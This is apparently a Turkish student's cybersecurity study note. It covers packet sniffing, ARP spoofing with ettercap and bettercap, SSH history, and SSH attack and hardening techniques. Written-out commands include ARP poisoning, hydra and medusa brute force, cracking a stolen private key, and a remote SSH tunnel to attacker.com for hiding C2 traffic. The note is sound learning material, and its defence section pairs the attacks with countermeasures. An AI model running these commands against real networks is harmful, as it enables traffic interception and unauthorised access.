---
Main Topic: Network_Security
Sub Topic: Protocols_and_Servers_2_PN
Links:
Date: 03-04-2026
Related Notes:
Tags:
---

# Protocols_and_Servers_2_PN
# Siber Güvenlik Notları

---

## Network Sniffing — Sadece Kendi Trafiğini mi Görürsün?

Wireshark ve tcpdump default olarak sadece kendi cihazına gelen/giden paketleri yakalar. Başkalarının trafiğini görmek için iki koşul gerekir: **promiscuous mode** ve **uygun network topolojisi**.

### Promiscuous Mode
NIC normalde kendine gelmeyen paketleri atar. Promiscuous mode'da gördüğü tüm frame'leri yakalar. Wireshark/tcpdump bunu otomatik açar. Ama bu tek başına yetmez.

### Network Topolojisi Meselesi

| Topoloji | Durum |
|---|---|
| **Hub** | Paketi tüm portlara yollar, promiscuous mode yeterli |
| **Switch** | Paketi sadece doğru porta yollar, promiscuous mode yetersiz |

Modern ağlar switch kullanır. TryHackMe lab'larında hub simülasyonu veya hazır MITM pozisyonu verilir.

### Switch'li Ortamda Trafik Yakalama Yöntemleri

**ARP Spoofing / ARP Poisoning:**
Kurban ve gateway'e sahte ARP reply'ları gönderilir, trafik saldırganın üzerinden geçer.
Araçlar: `arpspoof`, `ettercap`, `bettercap`

**MAC Flooding:**
Switch'in CAM tablosu doldurulur, switch hub moduna düşer.
Araç: `macof`

**Port Mirroring (SPAN):**
Switch yönetim panelinden bir portun trafiği başka porta kopyalanır. Switch'e admin erişimi gerektirir. Blue team / sysadmin yöntemi.

---

## Wiretap ve Port Monitoring

### Wiretap (Fiziksel/Pasif Dinleme)
Trafiğin geçtiği fiziksel ortama doğrudan erişim.

- **Ethernet tap:** Araya fiziksel bir network tap cihazı takılır, trafik akmaya devam eder, tap sessizce kopyalar. Tespit neredeyse imkansız.
- **Fiber tap:** Fiber kablo bükülür, sızan ışık yakalanır. Devlet seviyesi.
- **Wi-Fi monitor mode:** NIC monitor mode'a alınır, havadaki tüm 802.11 frame'leri yakalanır, ağa bağlı olmak gerekmez. Araçlar: `airmon-ng`, `airodump-ng`

### Port Monitoring / Port Mirroring
Switch üzerinde yazılımsal çözüm. Switch yönetim panelinden bir portun trafiği başka porta kopyalanır, o porta kendi makine bağlanır. IDS/IPS sistemleri bu şekilde beslenir.

### Monitor Mode vs Promiscuous Mode

| | Promiscuous Mode | Monitor Mode |
|---|---|---|
| Katman | Layer 2, bağlı olunan ağ | Layer 1, tüm RF ortamı |
| Bağlantı gerekir mi? | Evet | Hayır |
| Ne yakalar | Kendi ağındaki frame'ler | Havadaki tüm 802.11 frame'leri |
| Kullanım | Ethernet sniffing | Wi-Fi analizi |

---

## Ettercap ve Bettercap

### Ettercap
Eski ama klasik MITM framework'ü (2001'den beri). GUI (`ettercap -G`), terminal (`-T`) ve ncurses (`-C`) modu var.

**Özellikler:** ARP poisoning, DNS spoofing, SSL stripping, paket filtreleme, plugin sistemi

```bash
ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.105//
# İlk IP = gateway, İkinci IP = hedef
```

**Zayıf yanları:** Aktif geliştirme yavaşladı, modern SSL/TLS karşısında yetersiz.

### Bettercap
Ettercap'in modern halefi, Go ile yazılmış.

**Özellikler:** ARP, DNS, HTTPS, HSTS bypass, Wi-Fi, BLE saldırıları, Web UI, modüler yapı

```bash
bettercap -iface eth0

# Shell içinde:
net.probe on                        # Ağdaki cihazları keşfet
net.show                            # Listele
set arp.spoof.targets 192.168.1.105
arp.spoof on                        # ARP poisoning başlat
net.sniff on                        # Trafik yakalamaya başla
```

**Caplet (script) sistemi:**
```bash
# mitm.cap
net.probe on
set arp.spoof.targets 192.168.1.105
arp.spoof on
net.sniff on

bettercap -iface eth0 -caplet mitm.cap
```

### Karşılaştırma

| | Ettercap | Bettercap |
|---|---|---|
| Dil | C | Go |
| Aktif geliştirme | Hayır | Evet |
| Wi-Fi saldırısı | Hayır | Evet |
| BLE | Hayır | Evet |
| Web UI | Hayır | Evet |
| Öğrenme eğrisi | Düşük | Orta |

---

## Ncurses Nedir?

Terminal üzerinde çalışan bir UI kütüphanesi. Tam GUI de değil, düz komut satırı da değil — ikisinin arası. Terminal içinde kutu, menü, renk, imleç kontrolü sağlar.

Ettercap'te `-C` flag'i ile açılır:
```bash
ettercap -C
```

**Neden var:** SSH ile uzak sunucuya bağlıyken X11 forwarding olmadan GUI açılamaz. Ncurses terminal üzerinden kullanılabilir bir arayüz sunar.

**Başka kullanım örnekleri:** `htop`, `nano`, `nmtui`, `alsamixer`

---

## Bettercap'i Invoke Etmenin 3 Yolu

**1. İnteraktif Mode:**
```bash
bettercap -iface eth0
```
Shell açılır, komutlar tek tek yazılır.

**2. Caplet (Script) Mode:**
```bash
bettercap -iface eth0 -caplet mitm.cap
```
Önceden yazılmış `.cap` script dosyasını çalıştırır. Otomasyon için ideal.

**3. Inline (Tek Komut):**
```bash
bettercap -iface eth0 -eval "net.probe on; arp.spoof on"
```
Shell açmadan `-eval` ile direkt komut gönderilir.

---

## SSH Nedir, Nasıl Ortaya Çıktı ve Neden Evrensel Kabul Gördü?

### Doğuşu
1995'te Fin'li araştırmacı **Tatu Ylönen** tarafından geliştirildi. Helsinki Üniversitesi'nde ağ saldırısına maruz kalması üzerine — birisi ağdaki şifreleri sniff ediyordu — güvenli bir alternatif olarak yazdı. **C** diliyle geliştirildi.

O dönemde kullanılan telnet, rlogin, rsh gibi protokollerin hiçbirinde şifreleme yoktu. Ylönen SSH'ı internete açtıktan birkaç gün sonra binlerce indirme geldi, yılsonunda 50'den fazla ülkede 20.000+ kullanıcıya ulaşmıştı.

### SSH-1'den SSH-2'ye
SSH-1'in kriptografik zayıflıkları vardı. Protokol ticari şirkete devredilince lisans kısıtlanmaya başladı. Buna tepki olarak **OpenSSH**, 1999'da OpenBSD ekibi tarafından fork'landı. Bugün kullanılan `ssh` komutu neredeyse kesinlikle OpenSSH'tır.

**SSH-2**, 2006'da RFC 4251-4254 olarak standardize edildi. SSH-1 ile protokol seviyesinde uyumsuz, çok daha sağlam.

### Neden Şüphesiz Kabul Gördü?
- **Zamanlama:** İnternet patlaması yaşanıyordu, telnet'in tehlikesi tam o an gün yüzüne çıkmıştı
- **OpenSSH:** Ticari lisans sorununu ortadan kaldırdı, her yere entegre edildi
- **Teknik sağlamlık:** Asimetrik kriptografi (RSA, ECDSA, Ed25519) + simetrik şifreleme (AES) + HMAC
- **Çok amaçlılık:** Terminal bağlantısı, SCP/SFTP, port forwarding, X11 forwarding, jump host

### Alternatifleri

| Protokol | Durum | Sorun |
|---|---|---|
| Telnet | Ölü | Şifreleme yok |
| rlogin / rsh | Ölü | Şifreleme yok, güvensiz |
| Mosh | Aktif | SSH üzerine kurulu, SSH'ı tamamlıyor, yerini almıyor |
| WireGuard | Farklı amaç | VPN protokolü |

---

## SSH — Saldırı ve Savunma

### Saldırı Tarafı

#### 1. Brute Force / Dictionary Attack
En yaygın saldırı. SSH parola auth'a izin veriyorsa kullanıcı adı + parola kombinasyonları denenir.
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
medusa -h 192.168.1.10 -u root -P passwords.txt -M ssh
```

#### 2. Username Enumeration
OpenSSH 7.7 öncesinde geçerli/geçersiz kullanıcı adına verilen yanıt süresi farklıydı. Timing analizi ile kullanıcı adları tespit edilebiliyordu.

**CVE-2018-15473**
```bash
python3 ssh_enum.py 192.168.1.10 wordlist.txt
```

#### 3. Private Key Çalma
`~/.ssh/id_rsa` dosyası LFI, web shell veya başka bir vektörle ele geçirilirse direkt bağlantı sağlanabilir.
```bash
chmod 600 id_rsa
ssh -i id_rsa user@192.168.1.10
```
Key passphrase korumalıysa:
```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt
```

#### 4. SSH Tünelleme (C2 Gizleme)
Firewall SSH'a izin veriyorsa C2 trafiği SSH tüneli içinden geçirilebilir.

**Local Port Forwarding:**
```bash
ssh -L 8080:internal-server:80 user@jumphost
```

**Remote Port Forwarding (Reverse Shell):**
```bash
ssh -R 4444:localhost:4444 attacker@attacker.com
```

**Dynamic / SOCKS Proxy:**
```bash
ssh -D 9050 user@192.168.1.10
# Proxychains ile kombine edilir
```

#### 5. Host Key Spoofing / MITM
MITM pozisyonunda sahte SSH sunucusu ayağa kaldırılır. Kullanıcı "host key changed" uyarısı alır.

Araç: **ssh-mitm**

---

### Savunma Tarafı

#### 1. Parola Auth'u Kapat
`/etc/ssh/sshd_config`:
```
PasswordAuthentication no
PubkeyAuthentication yes
```

#### 2. Root Login'i Kapat
```
PermitRootLogin no
```

#### 3. Port Değiştir
```
Port 2222
```
Script kiddie taramalarını engeller, log gürültüsünü azaltır.

#### 4. Fail2Ban
```bash
apt install fail2ban
```
```ini
[sshd]
maxretry = 3
bantime = 3600
```

#### 5. AllowUsers
```
AllowUsers ertugrul deploy
```

#### 6. Known_Hosts Yönetimi
Beklenmedik key değişikliği MITM sinyali olabilir.

---

### Özet Tablo

| Saldırı | Araç | Savunma |
|---|---|---|
| Brute force | hydra, medusa | Key-only auth |
| Username enum | CVE-2018-15473 | OpenSSH güncel tut |
| Key çalma | LFI, web shell | Dosya izinleri, MFA |
| C2 tünelleme | -L -R -D flag | Egress filtering, IDS |
| MITM | ssh-mitm | Known hosts kontrolü |